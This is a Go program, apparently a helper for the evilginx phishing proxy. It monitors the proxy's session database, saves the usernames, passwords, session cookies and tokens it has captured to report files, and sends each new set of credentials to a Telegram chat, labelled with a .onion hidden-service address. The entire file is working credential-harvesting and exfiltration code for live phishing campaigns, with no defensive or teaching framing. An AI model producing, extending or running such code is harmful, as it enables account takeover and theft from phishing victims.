package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"

	"github.com/tidwall/buntdb"
)

// Configuration for the reporter
type Config struct {
	EvilginxDBPath    string
	ReportsDir        string
	TelegramConfig    string
	HiddenService     string
	CheckInterval     time.Duration
	ProcessedSessions map[string]bool
}

// TelegramConfig holds the Telegram bot configuration
type TelegramConfig struct {
	BotToken string `json:"bot_token"`
	ChatID   string `json:"chat_id"`
	Enabled  bool   `json:"enabled"`
}

// Session represents an evilginx session
type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
}

// CookieToken represents a captured cookie
type CookieToken struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	HttpOnly bool   `json:"http_only"`
}

// SessionReport represents a session report
type SessionReport struct {
	SessionID     string                                `json:"session_id"`
	Phishlet      string                                `json:"phishlet"`
	Username      string                                `json:"username"`
	Password      string                                `json:"password"`
	HiddenService string                                `json:"hidden_service"`
	LandingURL    string                                `json:"landing_url"`
	IP            string                                `json:"ip"`
	UserAgent     string                                `json:"user_agent"`
	Timestamp     time.Time                             `json:"timestamp"`
	Cookies       map[string]map[string]*CookieToken    `json:"cookies"`
	Custom        map[string]string                     `json:"custom"`
	BodyTokens    map[string]string                     `json:"body_tokens"`
	HTTPTokens    map[string]string                     `json:"http_tokens"`
}

var config *Config
var telegramConfig *TelegramConfig
var httpClient *http.Client

func main() {
	dbPath := flag.String("db", "", "Path to evilginx database")
	reportsDir := flag.String("reports", "./reports", "Path to reports directory")
	telegramConfigPath := flag.String("telegram", "", "Path to Telegram configuration")
	hiddenService := flag.String("onion", "", "Hidden service .onion address")
	interval := flag.Int("interval", 30, "Check interval in seconds")
	
	flag.Parse()

	if *dbPath == "" {
		log.Fatal("Database path is required (-db)")
	}

	config = &Config{
		EvilginxDBPath:    *dbPath,
		ReportsDir:        *reportsDir,
		TelegramConfig:    *telegramConfigPath,
		HiddenService:     *hiddenService,
		CheckInterval:     time.Duration(*interval) * time.Second,
		ProcessedSessions: make(map[string]bool),
	}

	httpClient = &http.Client{
		Timeout: 10 * time.Second,
	}

	// Load Telegram config if provided
	if config.TelegramConfig != "" {
		if err := loadTelegramConfig(); err != nil {
			log.Printf("Warning: Failed to load Telegram config: %v\n", err)
		} else if telegramConfig.Enabled {
			log.Println("Telegram notifications enabled")
		}
	}

	// Create reports directories
	createDirectories()

	log.Printf("Starting session monitor...")
	log.Printf("Database: %s", config.EvilginxDBPath)
	log.Printf("Reports: %s", config.ReportsDir)
	log.Printf("Check interval: %v", config.CheckInterval)
	
	if config.HiddenService != "" {
		log.Printf("Hidden service: %s", config.HiddenService)
	}

	// Start monitoring loop
	monitorSessions()
}

func loadTelegramConfig() error {
	data, err := ioutil.ReadFile(config.TelegramConfig)
	if err != nil {
		return err
	}

	telegramConfig = &TelegramConfig{}
	return json.Unmarshal(data, telegramConfig)
}

func createDirectories() {
	dirs := []string{
		filepath.Join(config.ReportsDir, "sessions"),
		filepath.Join(config.ReportsDir, "credentials"),
		filepath.Join(config.ReportsDir, "raw"),
	}

	for _, dir := range dirs {
		if err := os.MkdirAll(dir, 0755); err != nil {
			log.Fatalf("Failed to create directory %s: %v", dir, err)
		}
	}
}

func monitorSessions() {
	ticker := time.NewTicker(config.CheckInterval)
	defer ticker.Stop()

	// Initial check
	checkNewSessions()

	// Periodic checks
	for range ticker.C {
		checkNewSessions()
	}
}

func checkNewSessions() {
	db, err := buntdb.Open(config.EvilginxDBPath)
	if err != nil {
		log.Printf("Error opening database: %v", err)
		return
	}
	defer db.Close()

	err = db.View(func(tx *buntdb.Tx) error {
		err := tx.Ascend("sessions_id", func(key, val string) bool {
			var session Session
			if err := json.Unmarshal([]byte(val), &session); err != nil {
				log.Printf("Error parsing session: %v", err)
				return true
			}

			// Check if already processed
			if config.ProcessedSessions[session.SessionId] {
				return true
			}

			// Check if session has credentials
			if session.Username != "" && session.Password != "" {
				log.Printf("New session with credentials: %s", session.SessionId)
				processSession(&session)
				config.ProcessedSessions[session.SessionId] = true
			}

			return true
		})
		return err
	})

	if err != nil {
		log.Printf("Error checking sessions: %v", err)
	}
}

func processSession(session *Session) {
	report := convertToReport(session)

	// Save full session report
	if err := saveSessionReport(report); err != nil {
		log.Printf("Error saving session report: %v", err)
	} else {
		log.Printf("Saved session report: %s", session.SessionId)
	}

	// Save credentials
	if err := saveCredentials(report); err != nil {
		log.Printf("Error saving credentials: %v", err)
	} else {
		log.Printf("Saved credentials: %s", session.SessionId)
	}

	// Send Telegram notification
	if telegramConfig != nil && telegramConfig.Enabled {
		if err := sendTelegramNotification(report); err != nil {
			log.Printf("Error sending Telegram notification: %v", err)
		} else {
			log.Printf("Telegram notification sent: %s", session.SessionId)
		}
	}
}

func convertToReport(session *Session) *SessionReport {
	hiddenService := config.HiddenService
	if hiddenService == "" {
		hiddenService = "N/A"
	}

	return &SessionReport{
		SessionID:     session.SessionId,
		Phishlet:      session.Phishlet,
		Username:      session.Username,
		Password:      session.Password,
		HiddenService: hiddenService,
		LandingURL:    session.LandingURL,
		IP:            session.RemoteAddr,
		UserAgent:     session.UserAgent,
		Timestamp:     time.Unix(session.UpdateTime, 0),
		Cookies:       session.CookieTokens,
		Custom:        session.Custom,
		BodyTokens:    session.BodyTokens,
		HTTPTokens:    session.HttpTokens,
	}
}

func saveSessionReport(report *SessionReport) error {
	sessionIDShort := report.SessionID
	if len(sessionIDShort) > 8 {
		sessionIDShort = sessionIDShort[:8]
	}
	
	filename := fmt.Sprintf("%s_%s.json",
		report.Timestamp.Format("20060102_150405"),
		sessionIDShort)

	path := filepath.Join(config.ReportsDir, "sessions", filename)

	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return err
	}

	return ioutil.WriteFile(path, data, 0644)
}

func saveCredentials(report *SessionReport) error {
	creds := map[string]interface{}{
		"timestamp":      report.Timestamp.Format(time.RFC3339),
		"hidden_service": report.HiddenService,
		"phishlet":       report.Phishlet,
		"username":       report.Username,
		"password":       report.Password,
		"ip":             report.IP,
		"session_id":     report.SessionID,
	}

	sessionIDShort := report.SessionID
	if len(sessionIDShort) > 8 {
		sessionIDShort = sessionIDShort[:8]
	}

	filename := fmt.Sprintf("%s_%s_creds.json",
		report.Timestamp.Format("20060102_150405"),
		sessionIDShort)

	path := filepath.Join(config.ReportsDir, "credentials", filename)

	data, err := json.MarshalIndent(creds, "", "  ")
	if err != nil {
		return err
	}

	return ioutil.WriteFile(path, data, 0644)
}

func sendTelegramNotification(report *SessionReport) error {
	if telegramConfig == nil {
		return fmt.Errorf("telegram config not loaded")
	}

	message := formatTelegramMessage(report)
	return sendTelegramMessage(message)
}

func formatTelegramMessage(report *SessionReport) string {
	msg := "🔐 <b>New Credentials Captured</b>\n\n"
	msg += fmt.Sprintf("🌐 <b>Hidden Service:</b> %s\n", report.HiddenService)
	msg += fmt.Sprintf("🎯 <b>Phishlet:</b> %s\n", report.Phishlet)
	msg += fmt.Sprintf("👤 <b>Username:</b> <code>%s</code>\n", report.Username)
	msg += fmt.Sprintf("🔑 <b>Password:</b> <code>%s</code>\n", report.Password)
	msg += fmt.Sprintf("📍 <b>IP:</b> %s\n", report.IP)
	msg += fmt.Sprintf("🕐 <b>Time:</b> %s\n", report.Timestamp.Format("2006-01-02 15:04:05 UTC"))

	if len(report.Cookies) > 0 {
		cookieCount := 0
		for _, domainCookies := range report.Cookies {
			cookieCount += len(domainCookies)
		}
		msg += fmt.Sprintf("🍪 <b>Cookies:</b> %d captured\n", cookieCount)
	}

	if len(report.BodyTokens) > 0 {
		msg += fmt.Sprintf("🎫 <b>Tokens:</b> %d captured\n", len(report.BodyTokens))
	}

	return msg
}

func sendTelegramMessage(text string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", telegramConfig.BotToken)

	payload := map[string]interface{}{
		"chat_id":    telegramConfig.ChatID,
		"text":       text,
		"parse_mode": "HTML",
	}

	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("failed to marshal payload: %v", err)
	}

	resp, err := httpClient.Post(apiURL, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return fmt.Errorf("failed to send message: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		return fmt.Errorf("telegram API error: %s - %s", resp.Status, string(body))
	}

	return nil
}
